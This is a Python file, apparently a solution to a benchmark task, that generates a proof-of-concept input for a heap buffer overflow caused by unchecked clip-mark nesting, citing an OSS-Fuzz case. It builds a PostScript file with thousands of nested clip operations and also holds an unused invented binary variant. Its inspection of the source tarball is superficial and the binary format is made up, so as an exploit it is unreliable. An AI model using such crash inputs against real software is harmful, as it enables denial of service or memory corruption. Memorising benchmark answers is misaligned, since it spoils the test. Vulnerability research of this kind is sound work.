import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code to understand the format
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for clues about the file format
            # Based on OSS-Fuzz ID 42537168 and vulnerability description,
            # this appears to be related to a graphics/image processing library
            # with clip mark nesting issues. Likely PostScript/PDF or similar.
            
            # Check for common vulnerable file types
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith(('.c', '.cpp', '.cc')):
                        with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            if 'clip' in content.lower() and 'nest' in content.lower():
                                # Found relevant code, analyze further
                                # Based on typical graphics formats, we'll generate
                                # a PostScript-like file with deep nesting
                                return self._generate_ps_poc()
            
            # Default: generate a PostScript file with deep clip nesting
            return self._generate_ps_poc()
    
    def _generate_ps_poc(self) -> bytes:
        """Generate a PostScript file with deep clip nesting to trigger overflow."""
        # Create a minimal PostScript file with deep clip nesting
        # Based on the vulnerability: nesting depth not checked before pushing clip mark
        poc = b"""%!PS-Adobe-3.0
%%Creator: PoC Generator
%%Title: Heap Buffer Overflow PoC
%%Pages: 1
%%PageOrder: Ascend
%%EndComments

%%BeginProlog
/clipmark {
    /clipsave save def
    newpath
    0 0 moveto
    100 0 lineto
    100 100 lineto
    0 100 lineto
    closepath
    clip
} def
%%EndProlog

%%Page: 1 1
gsave
"""
        
        # Add deeply nested clip operations
        # The ground-truth length is 913919 bytes, but we can make it shorter
        # while still triggering the vulnerability by using repetition
        depth = 10000  # Enough to overflow heap buffer
        
        # Use efficient repetition
        poc += b"0 0 translate\n"
        poc += b"1 1 scale\n"
        
        # Create nested clips
        for i in range(depth):
            poc += b"clipmark\n"
            # Small transformation to avoid identical operations
            poc += b"1.0001 1.0001 scale\n"
            poc += b"0.5 0.5 translate\n"
        
        # End the file
        poc += b"""
grestore
showpage
%%Trailer
%%EOF
"""
        
        return poc
    
    def _generate_alternative_poc(self) -> bytes:
        """Alternative approach: binary format with repeated structures."""
        # Some graphics formats use binary structures
        # Create a minimal header followed by repeated clip records
        poc = bytearray()
        
        # Simple header (4 bytes magic + version)
        poc.extend(b'GFX1')
        poc.extend(struct.pack('<I', 1))  # Version
        
        # Record type for clip operation
        clip_record = bytearray()
        clip_record.extend(struct.pack('<B', 0x10))  # Clip operation
        clip_record.extend(struct.pack('<I', 1))     # Depth increment
        clip_record.extend(b'\x00' * 12)             # Transformation matrix
        
        # Add many clip records to cause overflow
        record_count = 50000
        poc.extend(struct.pack('<I', record_count))
        
        for i in range(record_count):
            poc.extend(clip_record)
            # Slightly modify to avoid compression
            poc[-1] = (poc[-1] + 1) & 0xFF
        
        return bytes(poc)
